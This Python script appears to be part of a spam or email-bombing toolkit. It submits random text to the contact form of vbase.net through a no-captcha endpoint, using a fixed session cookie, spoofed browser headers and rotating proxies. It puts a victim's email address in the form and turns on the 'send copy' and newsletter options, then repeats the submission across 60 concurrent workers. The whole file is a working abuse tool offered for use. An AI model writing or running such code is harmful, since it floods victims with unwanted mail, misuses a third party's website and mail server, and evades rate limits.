from os.path import basename

import requests

from module import Spam

cookies = {
    'PHPSESSID': '1b25da62f394104590aeb02b2a770bf0',
}

headers = {
    'authority': 'www.vbase.net',
    'accept': '*/*',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.vbase.net',
    'referer': 'https://www.vbase.net/en/contact.php',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}


class ConcreteSpam(Spam):

    def check_success(self, response: requests.Response | None) -> bool:
        return response.status_code < 400

    def post(self, target) -> requests.Response | None:
        data = {
            'Anrede': 'Frau',
            'Vorname': self.get_text(),
            'Nachname': self.get_text(),
            'lastname': '',
            'Firma': self.get_text(),
            'EMail': target,
            'Telefon': '123213321',
            'website': '',
            'subject': self.get_text(),
            'message': self.get_text(),
            'newsletter': 'on',
            'copy': 'on',
        }

        response = requests.post(
            'https://www.vbase.net/de/kontakt-form-process-nocaptcha.php',
            cookies=cookies,
            headers=headers,
            data=data, proxies=self.get_proxies()
        )

        return response


def main():
    s = ''
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently(60)


if __name__ == '__main__':
    main()
